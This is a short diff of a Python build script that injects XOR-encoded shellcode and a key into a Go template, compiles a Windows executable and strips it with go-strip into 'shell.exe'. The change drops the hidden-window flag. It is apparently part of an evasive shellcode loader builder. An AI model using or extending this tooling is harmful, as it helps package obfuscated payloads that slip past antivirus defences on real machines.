@@ -25,7 +25,7 @@ with open('template','r') as f:
 code = code.replace('$shellcode',shellcode+',').replace('$key',key)
 with open('main.go','w') as f:
 	f.write(code)
-os.system('GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o xor.exe')
+os.system('GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o xor.exe')
 os.system('./go-strip -f xor.exe -a -output shell.exe')
 os.system("strip shell.exe")
 os.remove('main.go')
